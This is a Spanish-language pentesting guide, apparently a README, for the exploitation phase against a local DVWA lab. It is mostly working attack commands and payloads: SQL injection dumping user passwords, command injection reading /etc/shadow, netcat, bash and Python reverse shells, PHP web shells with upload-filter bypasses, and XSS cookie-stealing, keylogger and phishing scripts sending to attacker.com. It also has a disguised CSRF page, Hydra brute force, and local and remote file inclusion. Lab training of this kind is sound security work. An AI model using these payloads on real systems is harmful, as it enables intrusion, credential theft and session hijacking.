# Fase de Explotación

**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)

## Objetivo

Explotar las vulnerabilidades identificadas en la fase de escaneo para obtener acceso, extraer datos sensibles y demostrar el impacto real de cada vulnerabilidad. Esta es la fase core del pentesting donde se valida si las vulnerabilidades son explotables.

## Subdirectorios

```
04-Explotacion/
├── README.md           # Este archivo
├── exploits-used/      # Scripts y exploits utilizados
└── payloads/           # Payloads personalizados
```

## ⚠️ ADVERTENCIA - Ética y Legalidad

**ESTE CONTENIDO ES SOLO PARA ENTORNOS AUTORIZADOS**:
- ✅ DVWA local en Docker
- ✅ Labs de pentesting autorizados
- ✅ Entornos de prueba propios
- ❌ NUNCA en sistemas sin autorización explícita

**El uso no autorizado de estas técnicas es ILEGAL.**

## Técnicas MITRE ATT&CK Aplicables

| ID | Técnica | Descripción |
|----|---------|-------------|
| T1190 | Exploit Public-Facing Application | Explotación de aplicación web |
| T1059 | Command and Scripting Interpreter | Ejecución de comandos |
| T1059.004 | Unix Shell | Shell commands en Linux |
| T1059.007 | JavaScript | Ejecución de JavaScript (XSS) |
| T1213 | Data from Information Repositories | Extracción de datos (SQLi) |
| T1505.003 | Web Shell | Instalación de web shell |
| T1110 | Brute Force | Ataques de fuerza bruta |
| T1185 | Browser Session Hijacking | CSRF |

## 1. SQL Injection (SQLi)

**Severidad**: Critical (CVSS 9.8)
**CWE**: CWE-89
**MITRE ATT&CK**: T1213, T1087

### 1.1. SQLi Básico (Low Security)

**Ubicación**: `/vulnerabilities/sqli/`

```bash
# URL base
TARGET="http://localhost:80/vulnerabilities/sqli/"

# Obtener PHPSESSID desde navegador después de login
COOKIE="PHPSESSID=tu-session-id; security=low"
```

**Test de vulnerabilidad**:

```bash
# Test 1: Comilla simple (detectar error)
curl "$TARGET?id=1'&Submit=Submit" --cookie "$COOKIE"

# Test 2: OR 1=1 (bypass)
curl "$TARGET?id=1' OR '1'='1&Submit=Submit" --cookie "$COOKIE"

# Test 3: UNION SELECT (extracción de datos)
curl "$TARGET?id=1' UNION SELECT null, null&Submit=Submit" --cookie "$COOKIE"

# Test 4: Determinar número de columnas
curl "$TARGET?id=1' UNION SELECT null, null&Submit=Submit" --cookie "$COOKIE"
# Si funciona, hay 2 columnas
```

**Mapeo ATT&CK**: T1213 (Data from Information Repositories)

### 1.2. Extracción de Datos

**Obtener versión de MySQL**:
```bash
curl "$TARGET?id=1' UNION SELECT null, version()-- -&Submit=Submit" --cookie "$COOKIE"
```

**Obtener usuario actual**:
```bash
curl "$TARGET?id=1' UNION SELECT null, user()-- -&Submit=Submit" --cookie "$COOKIE"
```

**Obtener nombre de la base de datos**:
```bash
curl "$TARGET?id=1' UNION SELECT null, database()-- -&Submit=Submit" --cookie "$COOKIE"
```

**Listar tablas**:
```bash
curl "$TARGET?id=1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -&Submit=Submit" --cookie "$COOKIE"
```

**Listar columnas de tabla 'users'**:
```bash
curl "$TARGET?id=1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -&Submit=Submit" --cookie "$COOKIE"
```

**Extraer usuarios y passwords**:
```bash
curl "$TARGET?id=1' UNION SELECT user, password FROM users-- -&Submit=Submit" --cookie "$COOKIE"
```

### 1.3. SQL Injection con SQLMap

```bash
# Automatización con SQLMap
sqlmap -u "$TARGET?id=1&Submit=Submit" \
    --cookie="$COOKIE" \
    --dbs \
    --batch

# Extraer tabla users
sqlmap -u "$TARGET?id=1&Submit=Submit" \
    --cookie="$COOKIE" \
    -D dvwa \
    -T users \
    --dump \
    --batch
```

### 1.4. Blind SQL Injection

**Ubicación**: `/vulnerabilities/sqli_blind/`

**Boolean-based Blind SQLi**:
```bash
BLIND_URL="http://localhost:80/vulnerabilities/sqli_blind/"

# Test TRUE (existe)
curl "$BLIND_URL?id=1' AND '1'='1&Submit=Submit" --cookie "$COOKIE"
# Debería mostrar: "User ID exists in the database"

# Test FALSE (no existe)
curl "$BLIND_URL?id=1' AND '1'='2&Submit=Submit" --cookie "$COOKIE"
# Debería mostrar: "User ID is MISSING from the database"
```

**Extracción carácter por carácter**:
```bash
# Obtener primer carácter del usuario actual
curl "$BLIND_URL?id=1' AND SUBSTRING(user(),1,1)='r'&Submit=Submit" --cookie "$COOKIE"

# Script para extraer usuario completo
for i in {1..20}; do
    for c in {a..z} {A..Z} {0..9} @ . _ -; do
        result=$(curl -s "$BLIND_URL?id=1' AND SUBSTRING(user(),$i,1)='$c'&Submit=Submit" --cookie "$COOKIE")
        if echo "$result" | grep -q "exists"; then
            echo -n "$c"
            break
        fi
    done
done
echo ""
```

### 1.5. Evidencias SQLi

```bash
# Capturar screenshot de SQLi exitoso
bash ../07-Scripts/capture-evidence.sh --screenshot exploit sqli "database-extraction" T1213

# Guardar payload y resultado
echo "1' UNION SELECT user, password FROM users-- -" > exploits-used/sqli-payload.txt

# Guardar output
curl "$TARGET?id=1' UNION SELECT user, password FROM users-- -&Submit=Submit" --cookie "$COOKIE" > exploits-used/sqli-users-dump.html
```

## 2. Command Injection

**Severidad**: Critical (CVSS 9.8)
**CWE**: CWE-78
**MITRE ATT&CK**: T1059.004

### 2.1. Command Injection Básico

**Ubicación**: `/vulnerabilities/exec/`

```bash
CMD_URL="http://localhost:80/vulnerabilities/exec/"
```

**Operadores de shell útiles**:
- `;` - Ejecutar siguiente comando
- `&&` - Ejecutar si anterior tuvo éxito
- `||` - Ejecutar si anterior falló
- `|` - Pipe (pasar output a siguiente comando)
- `` `command` `` - Command substitution
- `$(command)` - Command substitution

### 2.2. Tests de Inyección

**Test 1: Ping + comando**:
```bash
# Payload: 127.0.0.1; whoami
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; whoami&Submit=Submit" \
    --cookie "$COOKIE"
```

**Test 2: Listar archivos**:
```bash
# Payload: 127.0.0.1; ls -la
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; ls -la&Submit=Submit" \
    --cookie "$COOKIE"
```

**Test 3: Ver contenido de archivo**:
```bash
# Payload: 127.0.0.1; cat /etc/passwd
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; cat /etc/passwd&Submit=Submit" \
    --cookie "$COOKIE"
```

**Test 4: Información del sistema**:
```bash
# Payload: 127.0.0.1; uname -a
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; uname -a&Submit=Submit" \
    --cookie "$COOKIE"
```

### 2.3. Reverse Shell

**Preparar listener en tu máquina**:
```bash
# En una terminal, iniciar listener
nc -lvnp 4444
```

**Payload de reverse shell**:
```bash
# Netcat reverse shell
PAYLOAD="127.0.0.1; nc -e /bin/bash TU_IP 4444"

# Bash reverse shell (si nc no tiene -e)
PAYLOAD="127.0.0.1; bash -i >& /dev/tcp/TU_IP/4444 0>&1"

# Python reverse shell
PAYLOAD="127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"TU_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

# Ejecutar
curl -X POST "$CMD_URL" \
    --data "ip=$PAYLOAD&Submit=Submit" \
    --cookie "$COOKIE"
```

**Mapeo ATT&CK**: T1059.004 (Unix Shell)

### 2.4. Exfiltración de Datos

```bash
# Exfiltrar archivo de configuración
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; cat /var/www/html/config/config.inc.php&Submit=Submit" \
    --cookie "$COOKIE"

# Exfiltrar passwords del sistema
curl -X POST "$CMD_URL" \
    --data "ip=127.0.0.1; cat /etc/shadow&Submit=Submit" \
    --cookie "$COOKIE"
```

## 3. File Upload Vulnerabilities

**Severidad**: Critical (CVSS 9.8)
**CWE**: CWE-434
**MITRE ATT&CK**: T1505.003

### 3.1. PHP Web Shell Upload

**Ubicación**: `/vulnerabilities/upload/`

**Crear web shell simple**:
```php
<?php
// Guardar como: shell.php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Crear web shell avanzado**:
```php
<?php
// Guardar como: webshell.php
echo "<pre>";
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Executing: " . htmlspecialchars($cmd) . "\n\n";
    system($cmd);
} else {
    echo "Usage: ?cmd=whoami\n";
}
echo "</pre>";
?>
```

### 3.2. Upload via Web Interface

**Navegador**:
1. Ir a: http://localhost:80/vulnerabilities/upload/
2. Seleccionar archivo: `shell.php`
3. Click en "Upload"
4. Acceder a: http://localhost:80/hackable/uploads/shell.php?cmd=whoami

### 3.3. Upload via curl

```bash
UPLOAD_URL="http://localhost:80/vulnerabilities/upload/"

# Crear web shell
cat > payloads/webshell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload con curl
curl -X POST "$UPLOAD_URL" \
    -F "MAX_FILE_SIZE=100000" \
    -F "uploaded=@payloads/webshell.php" \
    -F "Upload=Upload" \
    --cookie "$COOKIE"

# Acceder al shell
SHELL_URL="http://localhost:80/hackable/uploads/webshell.php"
curl "$SHELL_URL?cmd=whoami" --cookie "$COOKIE"
curl "$SHELL_URL?cmd=ls -la" --cookie "$COOKIE"
curl "$SHELL_URL?cmd=cat /etc/passwd" --cookie "$COOKIE"
```

**Mapeo ATT&CK**: T1505.003 (Web Shell)

### 3.4. Bypass de Filtros (Medium/High)

**Medium security** - Valida tipo MIME:
```bash
# Cambiar Content-Type a image/jpeg
curl -X POST "$UPLOAD_URL" \
    -F "MAX_FILE_SIZE=100000" \
    -F "uploaded=@payloads/webshell.php;type=image/jpeg" \
    -F "Upload=Upload" \
    --cookie "PHPSESSID=$PHPSESSID; security=medium"
```

**High security** - Valida extensión:
```bash
# Usar extensión doble: shell.php.jpg
# Requiere configuración específica de servidor
```

## 4. Cross-Site Scripting (XSS)

**Severidad**: High (CVSS 6.1-8.8)
**CWE**: CWE-79
**MITRE ATT&CK**: T1059.007

### 4.1. Reflected XSS

**Ubicación**: `/vulnerabilities/xss_r/`

**Payloads básicos**:
```bash
XSS_URL="http://localhost:80/vulnerabilities/xss_r/"

# Test 1: Alert básico
curl "$XSS_URL?name=<script>alert('XSS')</script>" --cookie "$COOKIE"

# Test 2: Cookie stealing
PAYLOAD="<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
curl "$XSS_URL?name=$PAYLOAD" --cookie "$COOKIE"

# Test 3: DOM manipulation
PAYLOAD="<script>document.body.innerHTML='<h1>Hacked</h1>'</script>"
curl "$XSS_URL?name=$PAYLOAD" --cookie "$COOKIE"
```

### 4.2. Stored XSS

**Ubicación**: `/vulnerabilities/xss_s/`

**Más peligroso - persiste en base de datos**:

```bash
STORED_XSS_URL="http://localhost:80/vulnerabilities/xss_s/"

# Payload que se guarda en BD
PAYLOAD="<script>alert(document.cookie)</script>"

# Post con curl
curl -X POST "$STORED_XSS_URL" \
    --data "txtName=$PAYLOAD&mtxMessage=Test&btnSign=Sign Guestbook" \
    --cookie "$COOKIE"

# Ahora cada vez que alguien visite la página, ejecuta el script
```

**Mapeo ATT&CK**: T1059.007 (JavaScript), T1185 (Browser Session Hijacking)

### 4.3. XSS Avanzado

**Session hijacking**:
```javascript
<script>
fetch('http://attacker.com/log?cookie=' + document.cookie);
</script>
```

**Keylogger**:
```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>
```

**Phishing**:
```javascript
<script>
document.body.innerHTML = '<form action="http://attacker.com/steal" method="post"><input name="user"><input type="password" name="pass"><input type="submit"></form>';
</script>
```

## 5. Cross-Site Request Forgery (CSRF)

**Severidad**: Medium (CVSS 6.5)
**CWE**: CWE-352
**MITRE ATT&CK**: T1185

### 5.1. CSRF en Cambio de Password

**Ubicación**: `/vulnerabilities/csrf/`

**Crear página maliciosa**:
```html
<!-- Guardar como: csrf-attack.html -->
<html>
<body>
<h1>¡Has ganado un premio!</h1>
<p>Cargando...</p>

<!-- Form oculto que cambia password -->
<form id="csrf" action="http://localhost:80/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked123">
    <input type="hidden" name="password_conf" value="hacked123">
    <input type="hidden" name="Change" value="Change">
</form>

<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>
```

**Test**:
1. Usuario víctima está logueado en DVWA
2. Víctima visita: `file:///path/to/csrf-attack.html`
3. Password cambia automáticamente

## 6. Brute Force Attack

**Severidad**: High (CVSS 7.5)
**CWE**: CWE-307
**MITRE ATT&CK**: T1110.001

### 6.1. Brute Force con Hydra

**Ubicación**: `/vulnerabilities/brute/`

```bash
# Wordlists comunes
USERLIST="/usr/share/wordlists/metasploit/unix_users.txt"
PASSLIST="/usr/share/wordlists/rockyou.txt"

# Hydra HTTP Form
hydra -L $USERLIST -P $PASSLIST localhost http-get-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$PHPSESSID; security=low:F=incorrect"

# Hydra con usuario conocido
hydra -l admin -P $PASSLIST localhost http-get-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$PHPSESSID; security=low:F=incorrect"
```

### 6.2. Brute Force con Script Custom

```bash
# Script simple de brute force
cat > exploits-used/brute-force.sh << 'EOF'
#!/bin/bash
TARGET="http://localhost:80/vulnerabilities/brute/"
COOKIE="PHPSESSID=YOUR_SESSION; security=low"

passwords=(
    "password"
    "admin"
    "123456"
    "password123"
    "admin123"
)

for pass in "${passwords[@]}"; do
    echo "Trying: admin:$pass"
    response=$(curl -s "$TARGET?username=admin&password=$pass&Login=Login" --cookie "$COOKIE")

    if ! echo "$response" | grep -q "incorrect"; then
        echo "[+] SUCCESS: admin:$pass"
        break
    fi
done
EOF

chmod +x exploits-used/brute-force.sh
```

**Mapeo ATT&CK**: T1110.001 (Password Guessing)

## 7. File Inclusion

**Severidad**: High (CVSS 8.6)
**CWE**: CWE-98
**MITRE ATT&CK**: T1083, T1005

### 7.1. Local File Inclusion (LFI)

**Ubicación**: `/vulnerabilities/fi/`

```bash
FI_URL="http://localhost:80/vulnerabilities/fi/"

# LFI básico - leer /etc/passwd
curl "$FI_URL?page=../../../../../../etc/passwd" --cookie "$COOKIE"

# Leer archivo de configuración
curl "$FI_URL?page=../../../../../../var/www/html/config/config.inc.php" --cookie "$COOKIE"

# Leer logs de Apache
curl "$FI_URL?page=../../../../../../var/log/apache2/access.log" --cookie "$COOKIE"
```

### 7.2. Remote File Inclusion (RFI)

**Si está habilitado**:
```bash
# Hosting de shell malicioso en tu servidor
# http://attacker.com/shell.txt contiene: <?php system($_GET['cmd']); ?>

# RFI
curl "$FI_URL?page=http://attacker.com/shell.txt&cmd=whoami" --cookie "$COOKIE"
```

**Mapeo ATT&CK**: T1083 (File and Directory Discovery)

## 8. Captura de Evidencias

### 8.1. Durante la Explotación

```bash
# Iniciar logging de sesión
bash ../07-Scripts/logger.sh start explotacion-dvwa

# Capturar screenshots en momentos clave
bash ../07-Scripts/capture-evidence.sh --screenshot exploit sqli "users-extracted" T1213
bash ../07-Scripts/capture-evidence.sh --screenshot exploit cmdi "reverse-shell" T1059.004
bash ../07-Scripts/capture-evidence.sh --screenshot exploit upload "webshell-uploaded" T1505.003

# Iniciar captura de red
bash ../07-Scripts/capture-evidence.sh --start-capture exploit "attack-traffic" eth0

# [Realizar explotaciones]

# Detener captura de red
bash ../07-Scripts/capture-evidence.sh --stop-capture exploit "attack-traffic"

# Detener logging
# (escribir 'exit' en la sesión)
```

### 8.2. Documentar Cada Explotación

Para cada vulnerabilidad explotada, documentar:

```markdown
## [Nombre de la Vulnerabilidad]

**Fecha**: YYYY-MM-DD HH:MM
**Técnica ATT&CK**: TXXXX
**Severidad**: Critical/High/Medium
**CVSS**: X.X

### Payload Utilizado
```
[payload completo]
```

### Comando Ejecutado
```bash
[comando completo con curl/herramienta]
```

### Resultado
[Descripción del resultado]

### Evidencias
- Screenshot: `XXX_exploit_vuln_description.png`
- Log: `XXX_exploit_vuln_command.log`
- PCAP: `XXX_exploit_attack-traffic.pcap`

### Impacto Demostrado
- [Qué se logró con la explotación]

### Mitigación Recomendada
- [Cómo prevenir esta vulnerabilidad]
```

## 9. Próximos Pasos

Una vez completada la explotación:

1. ✅ Todas las vulnerabilidades críticas explotadas
2. ✅ Evidencias capturadas y documentadas
3. ✅ Payloads guardados en `exploits-used/`
4. ✅ Impacto de cada vulnerabilidad demostrado
5. ✅ Proceder con **Fase de Post-Explotación**:

```bash
cd ../05-Post-Explotacion
cat README.md
```

## 10. Referencias

- **OWASP Web Security Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz/
- **Reverse Shell Cheat Sheet**: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **SQLMap**: https://sqlmap.org/
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra

## 11. Checklist

- [ ] SQL Injection explotado
- [ ] Command Injection explotado
- [ ] File Upload - Web Shell subido
- [ ] Reflected XSS demostrado
- [ ] Stored XSS demostrado
- [ ] CSRF explotado
- [ ] Brute Force ejecutado
- [ ] File Inclusion (LFI/RFI) explotado
- [ ] Todas las evidencias capturadas
- [ ] Todos los payloads documentados
- [ ] Impacto de cada vuln documentado
- [ ] Sesiones de logging guardadas

---

**Última actualización**: 2024-12-03
**Fase siguiente**: 05-Post-Explotacion (Post-Exploitation)
